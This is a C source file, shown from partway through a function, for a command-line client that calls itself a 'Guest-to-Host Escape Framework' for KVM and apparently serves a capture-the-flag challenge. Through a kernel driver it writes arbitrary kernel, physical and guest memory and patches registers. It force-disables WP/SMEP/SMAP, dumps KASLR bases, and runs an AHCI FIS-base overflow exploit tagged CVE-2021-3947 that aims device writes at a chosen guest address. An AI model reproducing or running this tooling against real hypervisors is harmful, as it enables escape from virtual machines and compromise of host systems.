    printf("[+] MSR 0x%x = 0x%llx\n", msr, req.value);
}

void dump_page_tables(unsigned long virt_addr) {
    struct page_table_dump dump = { .virtual_addr = virt_addr };
    if (ioctl(fd, IOCTL_DUMP_PAGE_TABLES, &dump) < 0) {
        perror("[-] page table dump failed");
        return;
    }
    printf("[+] Page tables for 0x%lx:\n", virt_addr);
    printf("    PML4E:  0x%lx\n", dump.pml4e);
    printf("    PDPTE:  0x%lx\n", dump.pdpte);
    printf("    PDE:    0x%lx\n", dump.pde);
    printf("    PTE:    0x%lx\n", dump.pte);
    printf("    Physical: 0x%lx\n", dump.physical_addr);
}

void get_kaslr_info(void) {
    struct kaslr_info info = {0};
    if (ioctl(fd, IOCTL_GET_KASLR_INFO, &info) < 0) {
        perror("[-] get KASLR info failed");
        return;
    }
    printf("[+] KASLR Information:\n");
    printf("    Kernel base:  0x%lx\n", info.kernel_base);
    printf("    KASLR slide:  0x%lx\n", info.kaslr_slide);
    printf("    Physmap base: 0x%lx\n", info.physmap_base);
    printf("    Vmalloc base: 0x%lx\n", info.vmalloc_base);
    printf("    Vmemmap base: 0x%lx\n", info.vmemmap_base);
}

void dump_critical_regions(void) {
    printf("[+] Dumping critical memory regions for analysis\n\n");
    
    printf("[1] Control Registers:\n");
    for (int i = 0; i <= 4; i++) {
        if (i != 1) read_cr_register(i);
    }
    
    printf("\n[2] Critical MSRs:\n");
    read_msr_register(0xC0000080);
    read_msr_register(0xC0000082);
    read_msr_register(0xC0000101);
    read_msr_register(0xC0000102);
    
    printf("\n[3] KASLR Info:\n");
    get_kaslr_info();
    
    printf("\n[4] CTF Hypercalls:\n");
    hypercall_batch();
    
    printf("\n[5] VMX Handlers:\n");
    analyze_vmx_handlers();
}

/* ========================================================================
 * Memory Write Operations
 * ======================================================================== */

void write_kernel_mem(unsigned long addr, const unsigned char *data, size_t size, int disable_wp) {
    struct kernel_mem_write req = {
        .kernel_addr = addr,
        .length = size,
        .user_buffer = (unsigned char *)data,
        .disable_wp = disable_wp
    };
    
    printf("[*] Writing %zu bytes to kernel 0x%lx (WP bypass: %s)\n", 
           size, addr, disable_wp ? "yes" : "no");
    
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("[-] write_kernel_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_kernel_mem_hex(unsigned long addr, const char *hex_data, int disable_wp) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_kernel_mem(addr, data, len, disable_wp);
}

void write_physical_mem(unsigned long phys_addr, const unsigned char *data, size_t size) {
    struct physical_mem_write req = {
        .phys_addr = phys_addr,
        .length = size,
        .user_buffer = (unsigned char *)data
    };
    
    printf("[*] Writing %zu bytes to physical 0x%lx\n", size, phys_addr);
    
    if (ioctl(fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        perror("[-] write_physical_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_physical_mem_hex(unsigned long phys_addr, const char *hex_data) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_physical_mem(phys_addr, data, len);
}

void write_guest_mem(unsigned long gpa, const unsigned char *data, size_t size, int mode) {
    const char *modes[] = {"GPA", "GVA", "GFN"};
    struct guest_mem_write req = {
        .gpa = gpa,
        .gva = 0,
        .length = size,
        .user_buffer = (unsigned char *)data,
        .mode = mode
    };
    
    printf("[*] Writing %zu bytes to guest %s 0x%lx\n", size, modes[mode % 3], gpa);
    
    if (ioctl(fd, IOCTL_WRITE_GUEST_MEM, &req) < 0) {
        perror("[-] write_guest_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_guest_mem_hex(unsigned long gpa, const char *hex_data, int mode) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_guest_mem(gpa, data, len, mode);
}

void write_msr(unsigned int msr, unsigned long long value) {
    struct msr_write_request req = { .msr = msr, .value = value };
    printf("[*] Writing MSR 0x%x = 0x%llx\n", msr, value);
    if (ioctl(fd, IOCTL_WRITE_MSR, &req) < 0) {
        perror("[-] write_msr failed");
        return;
    }
    printf("[+] MSR write successful\n");
}

void write_cr(int cr_num, unsigned long value, unsigned long mask) {
    struct cr_write_request req = { .cr_num = cr_num, .value = value, .mask = mask };
    printf("[*] Writing CR%d = 0x%lx (mask: 0x%lx)\n", cr_num, value, mask);
    if (ioctl(fd, IOCTL_WRITE_CR_REGISTER, &req) < 0) {
        perror("[-] write_cr failed");
        return;
    }
    printf("[+] CR write successful\n");
}

void memset_kernel(unsigned long addr, unsigned char value, size_t size) {
    struct memset_request req = { .addr = addr, .value = value, .length = size, .addr_type = 0 };
    printf("[*] Memset kernel 0x%lx with 0x%02x (%zu bytes)\n", addr, value, size);
    if (ioctl(fd, IOCTL_MEMSET_KERNEL, &req) < 0) {
        perror("[-] memset_kernel failed");
        return;
    }
    printf("[+] Memset successful\n");
}

void memset_physical(unsigned long phys_addr, unsigned char value, size_t size) {
    struct memset_request req = { .addr = phys_addr, .value = value, .length = size, .addr_type = 1 };
    printf("[*] Memset physical 0x%lx with 0x%02x (%zu bytes)\n", phys_addr, value, size);
    if (ioctl(fd, IOCTL_MEMSET_PHYSICAL, &req) < 0) {
        perror("[-] memset_physical failed");
        return;
    }
    printf("[+] Memset successful\n");
}

void patch_bytes(unsigned long addr, const char *orig_hex, const char *patch_hex, 
                 int verify, int addr_type) {
    struct patch_request req = {0};
    int orig_len = parse_hex_pattern(orig_hex, req.original, 32);
    int patch_len = parse_hex_pattern(patch_hex, req.patch, 32);
    
    if (orig_len < 0 || patch_len < 0 || orig_len != patch_len) {
        printf("[-] Invalid hex pattern or length mismatch\n");
        return;
    }
    
    req.addr = addr;
    req.length = patch_len;
    req.verify_original = verify;
    req.addr_type = addr_type;
    
    printf("[*] Patching %s 0x%lx (%d bytes)\n",
           addr_type ? "physical" : "kernel", addr, patch_len);
    
    if (ioctl(fd, IOCTL_PATCH_BYTES, &req) < 0) {
        perror("[-] patch_bytes failed");
        return;
    }
    printf("[+] Patch applied successfully\n");
}

/* ========================================================================
 * Address Conversion Operations
 * ======================================================================== */

void convert_virt_to_phys(unsigned long virt_addr) {
    struct virt_to_phys_request req = { .virt_addr = virt_addr };
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &req) < 0 || req.status != 0) {
        printf("[-] virt_to_phys failed\n");
        return;
    }
    printf("[+] Virtual: 0x%lx -> Physical: 0x%lx (PFN: 0x%lx)\n",
           req.virt_addr, req.phys_addr, req.pfn);
}

void convert_phys_to_virt(unsigned long phys_addr, int use_ioremap) {
    struct phys_to_virt_request req = { .phys_addr = phys_addr, .use_ioremap = use_ioremap };
    if (ioctl(fd, IOCTL_PHYS_TO_VIRT, &req) < 0 || req.status != 0) {
        printf("[-] phys_to_virt failed\n");
        return;
    }
    printf("[+] Physical: 0x%lx -> Virtual: 0x%lx\n", req.phys_addr, req.virt_addr);
}

void convert_hva_to_pfn(unsigned long hva) {
    struct hva_to_pfn_request req = { .hva = hva };
    if (ioctl(fd, IOCTL_HVA_TO_PFN, &req) < 0 || req.status != 0) {
        printf("[-] hva_to_pfn failed\n");
        return;
    }
    printf("[+] HVA: 0x%lx -> PFN: 0x%lx (PA: 0x%lx)\n", req.hva, req.pfn, req.pfn << 12);
}

void convert_pfn_to_hva(unsigned long pfn) {
    struct addr_conv_request req = { .input_addr = pfn };
    if (ioctl(fd, IOCTL_PFN_TO_HVA, &req) < 0 || req.status != 0) {
        printf("[-] pfn_to_hva failed\n");
        return;
    }
    printf("[+] PFN: 0x%lx -> HVA: 0x%lx\n", pfn, req.output_addr);
}

void convert_gpa_to_gfn(unsigned long gpa) {
    struct addr_conv_request req = { .input_addr = gpa };
    if (ioctl(fd, IOCTL_GPA_TO_GFN, &req) < 0) {
        printf("[-] gpa_to_gfn failed\n");
        return;
    }
    printf("[+] GPA: 0x%lx -> GFN: 0x%lx\n", gpa, req.output_addr);
}

void convert_gfn_to_gpa(unsigned long gfn) {
    struct addr_conv_request req = { .input_addr = gfn };
    if (ioctl(fd, IOCTL_GFN_TO_GPA, &req) < 0) {
        printf("[-] gfn_to_gpa failed\n");
        return;
    }
    printf("[+] GFN: 0x%lx -> GPA: 0x%lx\n", gfn, req.output_addr);
}

void convert_gpa_to_hva(unsigned long gpa) {
    struct gpa_to_hva_request req = { .gpa = gpa };
    if (ioctl(fd, IOCTL_GPA_TO_HVA, &req) < 0 || req.status != 0) {
        printf("[-] gpa_to_hva failed\n");
        return;
    }
    printf("[+] GPA: 0x%lx -> HVA: 0x%lx (GFN: 0x%lx)\n", req.gpa, req.hva, req.gfn);
}

void decode_spte(unsigned long spte) {
    struct spte_to_pfn_request req = { .spte = spte };
    if (ioctl(fd, IOCTL_SPTE_TO_PFN, &req) < 0) {
        printf("[-] spte decode failed\n");
        return;
    }
    printf("[+] SPTE: 0x%lx\n", spte);
    printf("    PFN: 0x%lx, Present: %d, Writable: %d, Executable: %d\n",
           req.pfn, req.present, req.writable, req.executable);
}

void walk_ept(unsigned long eptp, unsigned long gpa) {
    struct ept_walk_request req = { .eptp = eptp, .gpa = gpa };
    if (ioctl(fd, IOCTL_WALK_EPT, &req) < 0) {
        printf("[-] EPT walk failed\n");
        return;
    }
    printf("[+] EPT Walk: GPA 0x%lx -> HPA 0x%lx\n", gpa, req.hpa);
    printf("    PML4E: 0x%lx, PDPTE: 0x%lx, PDE: 0x%lx, PTE: 0x%lx\n",
           req.pml4e, req.pdpte, req.pde, req.pte);
}

void translate_gva(unsigned long gva, unsigned long cr3) {
    struct gva_translate_request req = { .gva = gva, .cr3 = cr3 };
    if (ioctl(fd, IOCTL_TRANSLATE_GVA, &req) < 0 || req.status != 0) {
        printf("[-] GVA translation failed\n");
        return;
    }
    printf("[+] GVA: 0x%lx -> GPA: 0x%lx\n", gva, req.gpa);
}

void show_addr_info(unsigned long addr) {
    printf("[+] Address Analysis: 0x%016lx\n", addr);
    printf("    Page offset: 0x%lx\n", addr & 0xFFF);
    printf("    Rough PFN: 0x%lx\n", addr >> 12);
    
    struct virt_to_phys_request vp = { .virt_addr = addr };
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &vp) >= 0 && vp.status == 0) {
        printf("    -> Physical: 0x%lx (PFN: 0x%lx)\n", vp.phys_addr, vp.pfn);
    }
}

/* ========================================================================
 * Help and Main
 * ======================================================================== */

void print_help(void) {
    printf("╔══════════════════════════════════════════════════════════════════════════╗\n");
    printf("║          KVM Prober - Guest-to-Host Escape Framework v2.2                ║\n");
    printf("║                 Enhanced with Security Bypass & Mapping                  ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("SECURITY CONTROL:\n");
    printf("  force_disable_security           - Force disable WP/SMEP/SMAP NOW\n");
    printf("  auto_security_on/off             - Enable/disable auto-bypass\n\n");
    
    printf("HYPERCALL OPERATIONS:\n");
    printf("  hypercall <nr> [a0] [a1] [a2] [a3] - Execute single hypercall\n");
    printf("  hc_batch                           - Run CTF hypercalls 100-103\n");
    printf("  hc_scan <start> <end>              - Scan range of hypercalls\n");
    printf("  hc_test                            - Test CTF hypercalls\n\n");
    
    printf("SYMBOL OPERATIONS:\n");
    printf("  lookup <symbol>              - Lookup (exact + partial matches)\n");
    printf("  count                        - Show symbol count\n");
    printf("  list [max]                   - List symbols\n");
    printf("  search <pattern>             - Search by pattern\n");
    printf("  find <substring>             - Find containing substring\n");
    printf("  vmx / svm                    - Show handler info (DETAILED)\n\n");
    
    printf("GUEST MEMORY MAPPING:\n");
    printf("  map_guest - ***BROKEN***     - Will freeze and boot/reset server\n");
    printf("  scan_unmapped <start> <end>  - Scan unmapped for ANY data\n\n");
    
    printf("MEMORY READ OPERATIONS:\n");
    printf("  read_kernel <addr> <size>    - Read kernel virtual memory\n");
    printf("  read_phys <addr> <size>      - Read physical memory\n");
    printf("  read_guest <gpa> <size> <mode> - Read guest (0=GPA,1=GVA,2=GFN)\n");
    printf("  scan <start> <end> <step> <type> <pattern>\n");
    printf("  pattern <start> <end> <hex>  - Find pattern\n\n");
    
    printf("MEMORY WRITE OPERATIONS:\n");
    printf("  write_kernel <addr> <hex>    - Write hex to kernel memory\n");
    printf("  write_kernel_wp <addr> <hex> - Write with WP bypass\n");
    printf("  write_phys <addr> <hex>      - Write hex to physical memory\n");
    printf("  write_guest <gpa> <hex> <mode>\n");
    printf("  memset_kernel/memset_phys <addr> <val> <size>\n");
    printf("  patch <addr> <orig> <new> <type>\n\n");
    
    printf("ADDRESS CONVERSION:\n");
    printf("  v2p <virt>         p2v <phys> [ioremap]\n");
    printf("  hva2pfn <hva>      pfn2hva <pfn>\n");
    printf("  gpa2gfn <gpa>      gfn2gpa <gfn>\n");
    printf("  gpa2hva <gpa>      spte <value>\n");
    printf("  ept_walk <eptp> <gpa>   gva2gpa <gva> <cr3>\n");
    printf("  addrinfo <addr>\n\n");
    
    printf("CACHE OPERATIONS:\n");
    printf("  wbinvd                       - Flush ALL caches on ALL CPUs\n");
    printf("  clflush <addr>               - Flush cache line for address\n");
    printf("  write_flush <phys> <hex>     - Write + flush cache + WBINVD\n\n");
    
    printf("AHCI OPERATIONS (VM Escape):\n");
    printf("  ahci_info                    - Show AHCI controller info\n");
    printf("  ahci_read <port> <offset>    - Read AHCI port register\n");
    printf("  ahci_write <port> <off> <val>- Write AHCI port register\n");
    printf("  ahci_set_fb <port> <phys>    - Set FIS base (for CVE-2021-3947)\n");
    printf("  ahci_exploit <target_gpa>    - Attempt FIS overflow exploit\n\n");

    printf("REGISTER OPERATIONS:\n");
    printf("  cr <num>                 msr <num>\n");
    printf("  write_msr <msr> <val>    write_cr <num> <val> [mask]\n");
    printf("  pgtable <virt_addr>\n\n");
    
    printf("EXPLOITATION:\n");
    printf("  kaslr                    critical\n\n");
    
    printf("NOTE: Security bypass now works properly via kernel driver!\n");
    printf("      Auto-bypass enabled by default for all operations.\n\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) { print_help(); return 1; }
    
    char *cmd = argv[1];
    if (strcmp(cmd, "help") == 0) { print_help(); return 0; }
    if (init_driver() < 0) return 1;
    
    /* Security control */
    if (strcmp(cmd, "force_disable_security") == 0) force_disable_security();
    else if (strcmp(cmd, "auto_security_on") == 0) set_auto_security(1);
    else if (strcmp(cmd, "auto_security_off") == 0) set_auto_security(0);
    
    /* Hypercall operations */
    else if (strcmp(cmd, "hypercall") == 0 && argc > 2) {
        unsigned long nr = strtoul(argv[2], NULL, 0);
        unsigned long a0 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0;
        unsigned long a1 = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0;
        unsigned long a2 = (argc > 5) ? strtoul(argv[5], NULL, 0) : 0;
        unsigned long a3 = (argc > 6) ? strtoul(argv[6], NULL, 0) : 0;
        do_hypercall(nr, a0, a1, a2, a3);
    }
    else if (strcmp(cmd, "hc_batch") == 0) hypercall_batch();
    else if (strcmp(cmd, "hc_scan") == 0 && argc > 3)
        hypercall_scan(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "hc_test") == 0) test_ctf_hypercalls();
    
    /* Symbol operations */
    else if (strcmp(cmd, "lookup") == 0 && argc > 2) lookup_symbol(argv[2]);
    else if (strcmp(cmd, "count") == 0) get_symbol_count();
    else if (strcmp(cmd, "list") == 0) list_symbols(argc > 2 ? atoi(argv[2]) : 0);
    else if (strcmp(cmd, "search") == 0 && argc > 2) search_symbols(argv[2]);
    else if (strcmp(cmd, "find") == 0 && argc > 2) find_symbol_by_name(argv[2]);
    else if (strcmp(cmd, "vmx") == 0) analyze_vmx_handlers();
    else if (strcmp(cmd, "svm") == 0) analyze_svm_handlers();
    
    /* Guest memory mapping */
    else if (strcmp(cmd, "map_guest") == 0) map_guest_memory();
    else if (strcmp(cmd, "scan_unmapped") == 0 && argc > 3)
        scan_unmapped_for_data(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    
    /* Memory read operations */
    else if (strcmp(cmd, "read_kernel") == 0 && argc > 3) 
        read_kernel_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "read_phys") == 0 && argc > 3)
        read_physical_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "read_guest") == 0 && argc > 4)
        read_guest_mem(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), atoi(argv[4]));
    else if (strcmp(cmd, "scan") == 0 && argc > 6)
        scan_memory(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0),
                   strtoul(argv[4], NULL, 0), atoi(argv[5]), argv[6]);
    else if (strcmp(cmd, "pattern") == 0 && argc > 4)
        find_pattern(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), argv[4]);
    
    /* Memory write operations */
    else if (strcmp(cmd, "write_kernel") == 0 && argc > 3)
        write_kernel_mem_hex(strtoul(argv[2], NULL, 0), argv[3], 0);
    else if (strcmp(cmd, "write_kernel_wp") == 0 && argc > 3)
        write_kernel_mem_hex(strtoul(argv[2], NULL, 0), argv[3], 1);
    else if (strcmp(cmd, "write_phys") == 0 && argc > 3)
        write_physical_mem_hex(strtoul(argv[2], NULL, 0), argv[3]);
    else if (strcmp(cmd, "write_guest") == 0 && argc > 4)
        write_guest_mem_hex(strtoul(argv[2], NULL, 0), argv[3], atoi(argv[4]));
    else if (strcmp(cmd, "memset_kernel") == 0 && argc > 4)
        memset_kernel(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0), 
                      strtoul(argv[4], NULL, 0));
    else if (strcmp(cmd, "memset_phys") == 0 && argc > 4)
        memset_physical(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0),
                        strtoul(argv[4], NULL, 0));
    else if (strcmp(cmd, "patch") == 0 && argc > 5)
        patch_bytes(strtoul(argv[2], NULL, 0), argv[3], argv[4], 1, atoi(argv[5]));

    /* Address conversion operations */
    else if (strcmp(cmd, "v2p") == 0 && argc > 2)
        convert_virt_to_phys(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "p2v") == 0 && argc > 2)
        convert_phys_to_virt(strtoul(argv[2], NULL, 0), argc > 3 ? atoi(argv[3]) : 0);
    else if (strcmp(cmd, "hva2pfn") == 0 && argc > 2)
        convert_hva_to_pfn(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "pfn2hva") == 0 && argc > 2)
        convert_pfn_to_hva(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gpa2gfn") == 0 && argc > 2)
        convert_gpa_to_gfn(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gfn2gpa") == 0 && argc > 2)
        convert_gfn_to_gpa(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "gpa2hva") == 0 && argc > 2)
        convert_gpa_to_hva(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "spte") == 0 && argc > 2)
        decode_spte(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "ept_walk") == 0 && argc > 3)
        walk_ept(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "gva2gpa") == 0 && argc > 3)
        translate_gva(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(cmd, "addrinfo") == 0 && argc > 2)
        show_addr_info(strtoul(argv[2], NULL, 0));
    
    /* Register operations */
    else if (strcmp(cmd, "cr") == 0 && argc > 2) read_cr_register(atoi(argv[2]));
    else if (strcmp(cmd, "msr") == 0 && argc > 2) read_msr_register(strtoul(argv[2], NULL, 0));
    else if (strcmp(cmd, "write_msr") == 0 && argc > 3)
        write_msr(strtoul(argv[2], NULL, 0), strtoull(argv[3], NULL, 0));
    else if (strcmp(cmd, "write_cr") == 0 && argc > 3)
        write_cr(atoi(argv[2]), strtoul(argv[3], NULL, 0), 
                 argc > 4 ? strtoul(argv[4], NULL, 0) : 0);
    else if (strcmp(cmd, "pgtable") == 0 && argc > 2) 
        dump_page_tables(strtoul(argv[2], NULL, 0));
    
    /* Exploitation helpers */
    else if (strcmp(cmd, "kaslr") == 0) get_kaslr_info();
    else if (strcmp(cmd, "critical") == 0) dump_critical_regions();
    
    /* Cache operations */
    else if (strcmp(cmd, "wbinvd") == 0) {
        printf("[*] Executing WBINVD on all CPUs...\n");
        if (ioctl(fd, IOCTL_WBINVD, NULL) == 0) {
            printf("[+] WBINVD complete\n");
        } else {
            perror("[-] WBINVD failed");
        }
    }
    else if (strcmp(cmd, "clflush") == 0 && argc > 2) {
        struct clflush_request req = {0};
        uint64_t addr = strtoull(argv[2], NULL, 0);
        
        /* If address looks like a physical address (no 0xffff prefix) */
        if (addr < 0xffff000000000000ULL) {
            req.phys_addr = addr;
            req.use_phys = 1;
        } else {
            req.virt_addr = addr;
            req.use_phys = 0;
        }
        
        printf("[*] Flushing cache for address 0x%lx...\n", addr);
        if (ioctl(fd, IOCTL_CLFLUSH, &req) == 0) {
            printf("[+] CLFLUSH complete\n");
        } else {
            perror("[-] CLFLUSH failed");
        }
    }
    else if (strcmp(cmd, "write_flush") == 0 && argc > 3) {
        struct write_flush_request req;
        unsigned char data[512];
        int len = parse_hex_pattern(argv[3], data, sizeof(data));
        
        if (len <= 0) {
            printf("[-] Invalid hex data\n");
        } else {
            req.phys_addr = strtoull(argv[2], NULL, 0);
            req.buffer = (uint64_t)data;
            req.size = len;
            
            printf("[*] Writing %d bytes to phys 0x%lx with cache flush...\n", 
                   len, req.phys_addr);
            
            if (ioctl(fd, IOCTL_WRITE_AND_FLUSH, &req) == 0) {
                printf("[+] Write + flush complete\n");
            } else {
                perror("[-] Write + flush failed");
            }
        }
    }
    
    /* AHCI operations */
    else if (strcmp(cmd, "ahci_info") == 0) {
        struct ahci_info info;
        
        printf("[*] Getting AHCI info via kernel driver...\n");
        if (ioctl(fd, IOCTL_AHCI_INFO, &info) == 0) {
            printf("[+] AHCI Controller Info:\n");
            printf("    CAP:  0x%08x (ports: %d, slots: %d)\n", 
                   info.cap, (info.cap & 0x1f) + 1, ((info.cap >> 8) & 0x1f) + 1);
            printf("    GHC:  0x%08x\n", info.ghc);
            printf("    PI:   0x%08x\n", info.pi);
            printf("    VS:   %d.%d\n", (info.vs >> 16), info.vs & 0xffff);
            printf("\n    Port Status:\n");
            for (int i = 0; i < 6; i++) {
                if (info.pi & (1 << i)) {
                    printf("      Port %d: SSTS=0x%08x (DET=%d)\n", 
                           i, info.port_ssts[i], info.port_ssts[i] & 0xf);
                    if ((info.port_ssts[i] & 0xf) == 3) {
                        printf("              -> Device present!\n");
                    }
                }
            }
        } else {
            perror("[-] AHCI info failed");
        }
    }
    else if (strcmp(cmd, "ahci_read") == 0 && argc > 3) {
        struct ahci_reg_request req = {0};
        req.port = strtoul(argv[2], NULL, 0);
        req.offset = strtoul(argv[3], NULL, 0);
        
        if (ioctl(fd, IOCTL_AHCI_READ_REG, &req) == 0) {
            printf("[+] AHCI port %d offset 0x%x = 0x%08x\n", 
                   req.port, req.offset, req.value);
        } else {
            perror("[-] AHCI read failed");
        }
    }
    else if (strcmp(cmd, "ahci_write") == 0 && argc > 4) {
        struct ahci_reg_request req = {0};
        req.port = strtoul(argv[2], NULL, 0);
        req.offset = strtoul(argv[3], NULL, 0);
        req.value = strtoul(argv[4], NULL, 0);
        req.is_write = 1;
        
        printf("[*] Writing AHCI port %d offset 0x%x = 0x%08x\n", 
               req.port, req.offset, req.value);
        if (ioctl(fd, IOCTL_AHCI_WRITE_REG, &req) == 0) {
            printf("[+] Write successful\n");
        } else {
            perror("[-] AHCI write failed");
        }
    }
    else if (strcmp(cmd, "ahci_set_fb") == 0 && argc > 3) {
        struct ahci_fis_request req = {0};
        req.port = strtoul(argv[2], NULL, 0);
        req.fis_base = strtoull(argv[3], NULL, 0);
        if (argc > 4) {
            req.clb_base = strtoull(argv[4], NULL, 0);
        }
        
        printf("[*] Setting AHCI port %d FIS base to 0x%lx\n", req.port, req.fis_base);
        if (ioctl(fd, IOCTL_AHCI_SET_FIS_BASE, &req) == 0) {
            printf("[+] FIS base set successfully\n");
        } else {
            perror("[-] Set FIS base failed");
        }
    }
    else if (strcmp(cmd, "ahci_exploit") == 0 && argc > 2) {
        /* CVE-2021-3947 style exploit attempt */
        uint64_t target_gpa = strtoull(argv[2], NULL, 0);
        struct ahci_info info;
        int port = -1;
        
        printf("[*] AHCI FIS Overflow Exploit\n");
        printf("[*] Target GPA: 0x%lx\n", target_gpa);
        
        /* Get AHCI info */
        if (ioctl(fd, IOCTL_AHCI_INFO, &info) < 0) {
            perror("[-] Failed to get AHCI info");
            goto ahci_exploit_done;
        }
        
        /* Find a port with device */
        for (int i = 0; i < 6; i++) {
            if ((info.pi & (1 << i)) && ((info.port_ssts[i] & 0xf) == 3)) {
                port = i;
                break;
            }
        }
        
        if (port < 0) {
            printf("[-] No AHCI port with device found\n");
            goto ahci_exploit_done;
        }
        
        printf("[+] Using port %d\n", port);
        
        /* The exploit: Set FIS base so that D2H FIS lands on target */
        /* D2H FIS is at offset 0x40 in the receive FIS structure */
        uint64_t malicious_fb = target_gpa - 0x40;
        
        printf("[*] Setting malicious FIS base: 0x%lx\n", malicious_fb);
        
        struct ahci_fis_request fis_req = {
            .port = port,
            .fis_base = malicious_fb,
            .clb_base = 0
        };
        
        if (ioctl(fd, IOCTL_AHCI_SET_FIS_BASE, &fis_req) < 0) {
            perror("[-] Failed to set FIS base");
            goto ahci_exploit_done;
        }
        
        printf("[+] FIS base set. Device activity should trigger FIS writes.\n");
        printf("[*] Check hypercall 100 now!\n");
        
ahci_exploit_done:
        ;
    }
    
    else { printf("[-] Unknown command or missing args: %s\n", cmd); print_help(); }
    
    close(fd);
    return 0;
}